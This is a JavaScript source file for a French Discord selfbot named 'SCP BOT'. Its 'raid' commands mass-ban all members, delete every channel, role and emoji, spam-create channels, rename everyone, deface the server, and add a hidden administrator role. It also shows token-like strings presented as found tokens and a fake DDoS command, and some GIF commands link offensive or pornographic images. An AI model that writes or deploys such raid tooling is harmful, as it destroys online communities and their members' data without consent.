const Discord = require("discord.js"),
bot = new Discord.Client(),
sayembed = new Discord.RichEmbed(),
con = console.log,
chalk = require("chalk")
token = "TOKEN HERE ",

DiscordPermissions = [
"ADMINISTRATOR", "CREATE_INSTANT_INVITE", "KICK_MEMBERS",
"BAN_MEMBERS", "MANAGE_CHANNELS", "MANAGE_GUILD",
"ADD_REACTIONS", "VIEW_CHANNEL", "READ_MESSAGES",
"SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES",
"EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY",
"MENTION_EVERYONE", "USE_EXTERNAL_EMOJIS", "EXTERNAL_EMOJIS",
"CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS",
"MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME",
"MANAGE_NICKNAMES", "MANAGE_ROLES", "MANAGE_ROLES_OR_PERMISSIONS",
"MANAGE_WEBHOOKS", "MANAGE_EMOJIS"

  ];

commandIntervals = [];

bot.login(token)



bot.on('ready', () => {
   console.log(chalk.red(' '))
  console.log(chalk.red(''))
  console.log(chalk.red(''))
  console.log(chalk.red(' ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ '))
  console.log(chalk.red('▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌'))
  console.log(chalk.red('▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌'))
  console.log(chalk.red('▐░▌          ▐░▌          ▐░▌ carti ▐░▌'))
  console.log(chalk.red('▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░█▄▄▄▄▄▄▄█░▌'))
  console.log(chalk.red('▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░░▌'))
  console.log(chalk.red(' ▀▀▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ '))
  console.log(chalk.red('          ▐░▌▐░▌          ▐░▌          '))
  console.log(chalk.red(' ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌         '))
  console.log(chalk.red('▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          '))
  console.log(chalk.red(' ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀           '))
 console.log(chalk.red(' '))
  console.log(chalk.red(''))
  console.log(chalk.red(''))


});



bot.on('ready', () => {

let memberCount = bot.users.size;
let serverCount = bot.guilds.size;

con(
    `${"#".repeat(40)}\n` +
    `NAME : ${bot.user.tag}\n` +
    `ID : ${bot.user.id}\n`            +
    `${"#".repeat(40)}\n` +
  `Token : ${bot.token}\n`              +
      `Utilisateurs : ${memberCount}\n`             +
          `Serveurs     : ${serverCount}\n`             +
    `${"#".repeat(40)}\n`

  );
});




  bot.on('message', msg => { 

    if (msg.content === 'sban') {
            if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
      console.log(`Commande sban par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
        member.ban().then(function () {
          con(`NAME : ${member.nickname}!`);
        })
    })
   } 


  if (msg.author.id !== bot.user.id) return;
  if (msg.content === 'shelp') {
      console.log(`Commande shelp`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setTitle(`  ** __SCP BOT __ **   `)
    .addField(' **sbasic** :', '   __Affiche Les Commands Basic__  ')
    .addField(' **sraid**  :', '   __Affiche Les Commands RaidServ__  ')
      .addField(' **sfun**   :', '     __Affiche Les Commands Fun__ ')
    .addField(' **sgif**   :', '     __Affiche Les Commands Gif__  ')
    .addField(' **srpc**   :', '  __Affiche Les Commands Status/Jeux__  ')
    .addField(' **screds** :', '   __Affiche Le Développeur__   ')
      .setColor('#000000')
      .setFooter('  SCP BOT  ')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")
      .setTimestamp()

    msg.channel.send(helpAEmbed).catch(err => con(err));



  }

  if (msg.content === 'screds') {
      console.log(`Commande screds`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(` SCP BOT `)
      .addField('**JL CARTI**', 'Développeur')
      .addField('**SCP 079**', 'Développeur')
      .setColor('#000000')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }


  if (msg.content === 'sbasic') {
          console.log(`Commande sbasic`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(` ⚒️ __𝐎𝐮𝐯𝐞𝐫𝐭𝐮𝐫𝐞 𝐃𝐞𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐁𝐚𝐬𝐢𝐜__ ⚒️   `)
      .addField('**sping** :', '   __Affiche Le Ping Selfbot__   ')
      .addField('**smi** :', '     __Affiche Les Infos Du Membre__ ')
      .addField('**sinfo** :', '   __Affiche Les Infos Du Serveur__ ')
      .addField('**sclear** :', '  __Supprime Vos Messages__ ')
      .addField('**sstats** :', '  __Affiche Les Stats Du Profil__ ')
      .addField('**stoken** :', '  __Affiche Un Faux Token__ ')
      .addField('**sgetavatar** :', ' __Copier Une Pp Du Membre__ ')
      .setColor('#000000')
      .setFooter('★ SCP BOT ★')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")


    msg.channel.send(helpAEmbed).catch(err => con(err));

  }


  if(msg.content.startsWith("swatch")) {
          console.log(`Commande swatch`);
    if(msg.deletable) msg.delete()
    let args = msg.content.split(' ').slice(1).join(' ')
    bot.user.setActivity(args, {type: "WATCHING"})
  return msg.reply(':computer:  𝐒𝐓𝐀𝐓𝐔𝐒 𝐌𝐈𝐒 𝐀 𝐉𝐎𝐔𝐑𝐒 ! :computer: ').then(m => m.delete(5000));
  }


  if (msg.content.startsWith("shack")) {
              console.log(`Commande shack`);
  if (msg.deletable) msg.delete();
  let avatar_embed = new Discord.RichEmbed()
    .setAuthor(`Jacky  le pirate `)
    .setColor('#000000')
    .setImage('https://fifty-wp.s3.amazonaws.com/detours/uploads/2017/08/hacker-800x480.jpg')
  return msg.channel.send(avatar_embed).catch(e => {});
  }


  if (msg.content.startsWith("stkn")) {
    if (msg.deletable) msg.delete()

    var question = msg.content.split(" ").join(" ").slice(7)
    var tableauball = ["NTU4NjgxODczNDcyMDI4Njcy.D3aZOw.XWSbRuF8GwII1d_uO3A0OMDpBigqsdq", "NTUxNDY2MzYwMqsdqdqdjYyMzYxMTA5.D3q8Rw.7egR6Z2FRrJVJQo22KPJw94sqLY", "NTMwMTMyODIyMzMwMTc5NTg1.D0nsTQ._YtyrCwHOsVQRkk1XCFjkxZPMzA", ]

    let ball_embed = new Discord.RichEmbed()
      .setColor("Token")
      .setTitle("Requête de  " + msg.author.tag + "")
      .setDescription("" + question + "")
      .addField("Token Trouvé", "" + tableauball[Math.floor(Math.random() * 8)] + "")
      .setThumbnail(bot.user.iconURL)
    return msg.channel.send(ball_embed).catch(e => {});

  }
  if(msg.content.startsWith("slstn")) {
    if(msg.deletable) msg.delete()
    let args = msg.content.split(' ').slice(1).join(' ')
  bot.user.setActivity(args, {type: "LISTENING"})
  return msg.reply(':computer:  𝐒𝐓𝐀𝐓𝐔𝐒 𝐌𝐈𝐒 𝐀 𝐉𝐎𝐔𝐑𝐒 ! :computer: ').then(m => m.delete(5000));

  }

  if(msg.content.startsWith("slive")) {
    if(msg.deletable) msg.delete()
    let args = msg.content.split(' ').slice(1).join(' ')
    bot.user.setActivity(args, {type: "STREAMING", url: "https://www.twitch.tv/gothboiclique"})
  return msg.reply(':computer:  𝐒𝐓𝐀𝐓𝐔𝐒 𝐌𝐈𝐒 𝐀 𝐉𝐎𝐔𝐑𝐒 ! :computer: ').then(m => m.delete(5000));
    }

    if(msg.content.startsWith("splay")) {
      if(msg.deletable) msg.delete()
      let args = msg.content.split(' ').slice(1).join(' ')
      bot.user.setActivity(args, {type: "PLAYING"})
    return msg.reply(':computer:  𝐒𝐓𝐀𝐓𝐔𝐒 𝐌𝐈𝐒 𝐀 𝐉𝐎𝐔𝐑𝐒 ! :computer: ').then(m => m.delete(5000));
    }

    if (msg.content === 'srole') {
                  if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    con(`Commande srole par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.member.guild.createRole({
      name:'𛲡𛲡',
      permissions: "ADMINISTRATOR",
    })
    .then(function(role) {msg.member.addRole(role);});
   }
  

    if (msg.content === 'sgif') {
      if (msg.deletable) msg.delete();
      var helpAEmbed = new Discord.RichEmbed()
        .setTitle(`** 📎 __Ouverture Des Commandes Gif__ 📎 ** `)
        .addField('**stk78** :', '  __Affiche Un Gif TheKairi78__ ')
        .addField('**skenny** :', ' __Affiche Le Gif De Kenny78__ ')
        .addField('**sveski** :', ' __Affiche Le Gif De Vesqui__ ')
        .addField('**sfn** :', '    __Affiche Le Gif Front National__ ')
        .addField('**soctogone** :', ' __Affiche Le Gif Octogone__ ')
        .addField('**sko** :', '     __Affiche Le Gif KO Technique__ ')
        .addField('**sstress** :', ' __Affiche Le Gif Crise Dasthme__ ')
        .addField('**slink** :', ' __Affiche Le Gif Niquage De Mère__ ')
        .addField('**shack** :', ' __Affiche Le Gif Hackeur__ ')
        .setColor('#000000')
        .setFooter('★ SCP BOT ★')
              .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")


      msg.channel.send(helpAEmbed).catch(err => con(err));

    }
    if (msg.content.startsWith("sfn")) {
      if (msg.deletable) msg.delete();
      let avatar_embed = new Discord.RichEmbed()
        .setAuthor(`Personne persecuté par le  fn`)
        .setColor('#000000')
        .setImage('https://cdn.discordapp.com/attachments/561501020799107075/561913327283077120/Snapchat-1333227243.jpg')
      return msg.channel.send(avatar_embed).catch(e => {});
    }

    if (msg.content.startsWith("skenny")) {
      if (msg.deletable) msg.delete();
      let avatar_embed = new Discord.RichEmbed()
        .setAuthor(`Kenny le monstre du lochness `)
        .setColor('#000000')
        .setImage('https://cdn.discordapp.com/attachments/538960051704954881/567189756572598305/tenor.gif')
      return msg.channel.send(avatar_embed).catch(e => {});
    }

    if (msg.content.startsWith("stk78")) {
      if (msg.deletable) msg.delete();
      let avatar_embed = new Discord.RichEmbed()
        .setAuthor(`The Kairi ce fou de ta gueule `)
        .setColor('#000000')
        .setImage('https://cdn.discordapp.com/attachments/538960051704954881/567190012408627200/tenor.gif')
      return msg.channel.send(avatar_embed).catch(e => {});
    }


  if (msg.content === 'srpc') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(`** ✔️ __Ouverture Des Commands Status/Jeux__ ✔️ **`)
      .addField('**splay**  :', ' __Définir Le Statut [Joue]__  ')
      .addField('**slive**  :', ' __Définir Le Statut [Streaming]__  ')
      .addField('**swatch** :','  __Définir Le Statut [Regarde]__  ')
      .addField('**slstn**  :', ' __Définir Le Statut [Ecoute]__ ')
      .addField('**sreset** :', '  __Enlève Votre Statut Actif__ ')
      .setColor('#000000')
      .setFooter('★ SCP BOT ★')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")
      .setTimestamp()

    msg.channel.send(helpAEmbed).catch(err => con(err));

  }
  if (msg.content === 'sraid') {
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(`💥 __𝐎𝐮𝐯𝐞𝐫𝐭𝐮𝐫𝐞 𝐃𝐞𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐑𝐚𝐢𝐝__ 💥`)
      .addField('**sban** :', '  __Bannir Les Membres Du Serveur__ ')
      .addField('**sdeface** :', '  __Deface Tout Le Serveur__  ')
      .addField('**screatechannel** :', '  __Création En Masse De Channel__ ')
      .addField('**sclearchannel** :', '  __Supprime Tout Les Channels__  ')
      .addField('**sdeban** :', '  __Débannir Tout Les Membres Du Serveur__  ')
      .addField('**sdelemote** :', '  __Supprime Tout Les Emojis__  ')
      .addField('**sclearrole** :', '  __Supprime Tout Les Rôles__  ')
      .addField('**srole** :', '  __Créee un Rôle invisible admin__  ')
            .addField('**srename** :', '  __Rename tout le monde__  ')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")
      .setColor('#000000')
      .setFooter('★ SCP BOT ★')
      .setTimestamp()

    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

   if(msg.content.startsWith("srename")) {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    con(`Commande srename par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    let args = msg.content.split(" ").slice(1).join(" ");
    msg.guild.members.forEach(member => {
      member.setNickname(args);
    });
   }


  if (msg.content === 'sveski') {
        con(`Commande sveski par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(`𝐕𝐞𝐬𝐤𝐢`)
      .setImage('https://cdn.dribbble.com/users/1172342/screenshots/3178785/usain_bolt.gif')
      .setColor('#000000')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }


  if (msg.content === 'soctogone') {
        con(`Commande soctogone par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
        .setTitle(` 𝐎𝐜𝐭𝐨𝐠𝐨𝐧𝐞`)
        .setImage(`https://66.media.tumblr.com/d3a5549af2ed2818413c6de684819678/tumblr_ncbc45kqXR1ry1rm7o1_400.gif`)
      .setColor('#000000')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if (msg.content === 'slink') {
        con(`Commande slink par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setTitle("Link nique de la maman")
    .setImage("http://dl.phncdn.com/gif/5280022.gif    ")
    .setColor('#000000')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if (msg.content === 'sstress') {
        con(`Commande stress par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setTitle("𝐒𝐭𝐫𝐞𝐬𝐬")
    .setImage("https://destinationsante.com/wp-content/uploads/2015/02/asthme-enfant585..jpg")
    .setColor('#000000')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }

  if (msg.content === 'sko') {
        con(`Commande sko par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
    .setTitle(`𝐊.𝐎`)
    .setImage("https://66.media.tumblr.com/97f2149f68e0f0687b12b91fcc1d3882/tumblr_o1a9fk3BaX1ry1rm7o2_400.gif")
    .setColor('#000000')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }



  if (msg.content === 'sfun') {
        con(`Commande sfun par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    var helpAEmbed = new Discord.RichEmbed()
      .setTitle(`🚀 __𝐎𝐮𝐯𝐞𝐫𝐭𝐮𝐫𝐞 𝐃𝐞𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐞𝐬 𝐅𝐮𝐧__ 🚀`)
      .addField('**ssearch** :', ' __Recherche Sur Google Votre Définition__ ')
      .addField('**s8ball** :', ' __La Boule Répond Aux Questions__ ')
      .addField('**sip** :', '  __Géolocalise Une Ip__ ')
      .addField('**sddos** :', ' __Tape Une Fausse Attaque__ ')
      .setColor('#000000')
            .setImage("https://media.discordapp.net/attachments/582394384004153344/585665040573530115/giphy.gif")
      .setFooter(' SCP BOT ')
    msg.channel.send(helpAEmbed).catch(err => con(err));

  }



  if (msg.content === 'sping') {
        con(`Commande sping par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.reply(`Ping  :  ${Math.round(bot.ping)} 𝐦𝐬`)
  }

  if (msg.content === "stoken") {
        con(`Commande stoken par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.channel.send(` __***NTUxNDY2MzYwMjYyMzYxMTA5.D3q8Rw.7egR6Z2FRrJVJQo22KPJw94sqLY***__`)
  }



  if (msg.content === 'sddos') {
        con(`Commande sddos par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    msg.channel.send(':skull_crossbones: 𝘼𝙏𝙏𝘼𝙌𝙐𝙀 𝙀𝙉 𝘾𝙊𝙐𝙍𝙎...:skull_crossbones:   ')
      .then(msg => {
        msg.edit("▓▓░░░░░░░░░░░░░░░░░░░░░░ 10%");
        msg.edit("▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%");
        msg.edit("▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 30%");
        msg.edit("▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░ 40%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 50%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░ 60%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░ 70%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░ 80%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░ 90%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░ 93%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░ 97%");
        msg.edit("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 100%");
        msg.edit(":skull_crossbones: __**TARGET STATUS : OFFLINE**__ :skull_crossbones:");
        msg.delete
      });
  }




  if (msg.content === "sstats") {
        con(`Commande stats  `);
    var date = new Date(bot.uptime);
    var days = date.getUTCDate() - 1;
    var hours = date.getUTCHours();
    var minutes = date.getUTCMinutes();
    var embed = new Discord.RichEmbed();
    embed.setColor('#000000')
      .setImage("")
      .setFooter(' SCP BOT ')
      .setThumbnail(`${bot.user.avatarURL}`)
      .setTimestamp()
      .addField('Nombre de serveur:', `${bot.guilds.size}`, true)
      .addField('Nombre de users:', `${bot.users.size}`, false)
      .addField('Discord Version:', `${Discord.version}`, false)
      .addField('Uptime', days + " days, " + hours + " hours and " + minutes + " minutes.")

    msg.channel.sendEmbed(
      embed, {
        disableEveryone: true
      }
    );
  }

  if (msg.content.startsWith("sinfo")) {
            con(`Commande sinfo par ${msg.author.tag}`);
    if (msg.deletable) msg.delete();
    if (msg.channel.type === "dm") return;
    let infoEmbed = new Discord.RichEmbed()


      .setTitle("__Informations du Serveur.__")
      .setColor('#000000')
      .addField('**Nom** : ', msg.guild.name)
      .addField('**ID** : ', msg.guild.id)
      .addField('**Localisation** : ', msg.guild.region)
      .addField('**Date de création** : ', msg.guild.createdAt)
      .addField('**Créateur** : ', msg.guild.owner.user.tag)
      .addField('**Niveau de sécurité** : ', msg.guild.verificationLevel)
      .addField('**Rôles** : ', msg.guild.roles.size)
      .addField('**Nombre de membres** : ', msg.guild.memberCount)
      .addField('**Salons** : ', msg.guild.channels.size)
      .setThumbnail(msg.guild.iconURL)
      .setImage("https://cdn.discordapp.com/attachments/573762356732100620/579690720580075522/Multi_Color_Bar.gif")
      .setFooter(' SCP BOT ')
      .setTimestamp()

    msg.channel.send(infoEmbed);
  }

  if (msg.content.startsWith("smi")) {
                con(`Commande smi par ${msg.author.tag}`);
    if (msg.channel.type === "dm") return;
    if (msg.deletable) msg.delete();
    var karim = msg.mentions.members.first()
    var userinfo_embed = new Discord.RichEmbed()
      .setTitle('__Informations utilisateur.__')
      .setThumbnail(msg.author.avatarURL)
      .setColor('#000000')
      .addField("Pseudo :", `${msg.mentions.users.first().username}`)
      .addField("Date de création du compte :", karim.user.createdAt)
      .addField("Tag :", '#' + karim.user.discriminator)
      .addField("ID :", karim.user.id)
      .addField("Pseudo + tag :", karim.user.tag)
      .setImage('https://cdn.discordapp.com/attachments/573762356732100620/579690720580075522/Multi_Color_Bar.gif')
      .setFooter(' SCP BOT ')
      .setTimestamp()
    msg.channel.send(userinfo_embed).catch(err => con(err));
  }

  if(msg.content.startsWith("sclear")) {
                con(`Commande sclear par ${msg.author.tag}`);
    let args = msg.content.split(" ").slice(1);
    let messagecount = parseInt(args[0]) || 999;
    var deletedMessages = -1;
    msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200, 300, 400, 500, 600, 700, 800, 999) })
        .then(messages => {
            messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
        }).then(() => {
            if (deletedMessages === -1) deletedMessages = 0;

        }).catch(console.error);
       }




  if (msg.content === 'screatechannel') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
      if (i === 250) clearInterval(interval);
      msg.guild.createChannel("SCP BOT").then(i++);
    }, 100);
  }

  if (msg.content === 'sdeface') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
      msg.guild.createChannel("SCP BOT").then(i++);
    msg.guild.setRegion('South Africa')
    msg.guild.setIcon('https://media.discordapp.net/attachments/571744159564693529/573285018760249359/1490295445_v5y.gif');
    msg.guild.setName('SCP BOT')
  }

  if (msg.content === 'sclearchannel') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
    msg.guild.channels.forEach(chan => {
      if (chan.deletable) chan.delete();
    });
  }

  if (msg.content === 'sclearrole') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
    msg.guild.roles.forEach(role => {
      role.delete()
    });
  }

  if (msg.content === 'sdelemote') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
    msg.guild.emojis.forEach(emoji => {
      emoji.delete()
    });
  }


  if(msg.content.startsWith("sreset")) {
    if(msg.deletable) msg.delete()
    bot.user.setActivity(null, {});
    return msg.reply(':computer:  𝙑𝙤𝙩𝙧𝙚 𝙨𝙩𝙖𝙩𝙪𝙩 𝙙𝙚 𝙟𝙚𝙪 𝙖̀ 𝙚́𝙩𝙚́ 𝙧𝙚́𝙞𝙣𝙞𝙩𝙞𝙖𝙡𝙞𝙨𝙚́ 𝙖𝙫𝙚𝙘 𝙨𝙪𝙘𝙘𝙚̀𝙨 ! :computer: ').then(m => m.delete(5000));

    }

  if (msg.content === 'sdeban') {
                if (!msg.member.hasPermission("ADMINISTRATOR")) return msg.reply("Tu dois être ADMINISTRATOR pour faire cette commande");
    if (msg.deletable) msg.delete();
    let interval = setInterval(function () {
      msg.guild.fetchBans().then(bans => {
        bans.forEach(ban => {
          msg.guild.unban(ban.id);
        });
      });
    }, 1000);
  }

  if (msg.content.startsWith('ssearch')) {
    if (msg.deletable) msg.delete()
    let args = msg.content.split(' ')
    args.shift()
    msg.reply('Voici les résultats de la recherche : https://www.google.fr/search?q=' + args.join("%20"))

  }

  if (msg.content.startsWith('sip')) {
    if (msg.deletable) msg.delete()
    let args = msg.content.split(' ')
    args.shift()
    msg.reply('Voici les résultats de la recherche : http://ip-api.com/#' + args.join("%20"))

  }

  if (msg.content.startsWith("s8ball")) {
    if (msg.deletable) msg.delete()

    var question = msg.content.split(" ").join(" ").slice(7)
    var tableauball = ["Oui", "Non", "Peut être", "Je ne sais pas", "Sûrement", "C'est impensable", "C'est sûr", "Bien évidemment", "J'en suis certain", "C'est très probable", "Absolument", "Je plussoie", "Je moinsoie"]

    let ball_embed = new Discord.RichEmbed()
      .setColor("#000000")
      .setTitle("Question de " + msg.author.tag + "")
      .setDescription("" + question + "")
      .addField("Réponse", "" + tableauball[Math.floor(Math.random() * 8)] + "")
      .setThumbnail(bot.user.iconURL)
    return msg.channel.send(ball_embed).catch(e => {});

  }

  if (msg.content.startsWith("sgetavatar")) {
    if (msg.deletable) msg.delete();
    if (msg.channel.type === "dm") return;
    let getavatar = msg.mentions.members.first()
    bot.user.setAvatar(getavatar.user.avatarURL)
    msg.channel.sendMessage({
      "embed": {
        description: "" + " La Photo De Notre Chère Mister " + msg.mentions.users.first().username + " Est Réquisitionner Vers Votre Profil ! =)",
        color: 3447003,
        "image": {
          "url": getavatar.user.avatarURL,
          timestamp: new Date(),
        }
      }
    })
  }

    });
